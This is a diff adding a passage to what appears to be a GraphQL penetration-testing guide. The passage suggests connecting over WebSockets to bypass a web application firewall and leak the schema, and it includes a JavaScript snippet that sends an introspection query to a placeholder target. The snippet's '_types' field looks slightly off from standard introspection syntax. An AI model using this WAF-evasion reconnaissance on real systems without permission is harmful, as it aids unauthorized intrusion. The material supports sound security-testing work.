@@ -212,3 +212,28 @@ query {
 </script>
 ```
 
+As mentioned in [**this talk**](https://www.youtube.com/watch?v=tIo_t5uUK50), check if it might be possible to connect to graphQL via WebSockets as that might allow you to bypass a potential WAF and make the websocket communication leak the schema of the graphQL:
+
+```javascript
+ws = new WebSocket("wss://target/graphql", "graphql-ws")
+ws.onopen = function start(event) {
+  var GQL_CALL = {
+    extensions: {},
+    query: `
+        {
+            __schema {
+                _types {
+                    name
+                }
+            }
+        }`,
+  }
+
+  var graphqlMsg = {
+    type: "GQL.START",
+    id: "1",
+    payload: GQL_CALL,
+  }
+  ws.send(JSON.stringify(graphqlMsg))
+}
+```
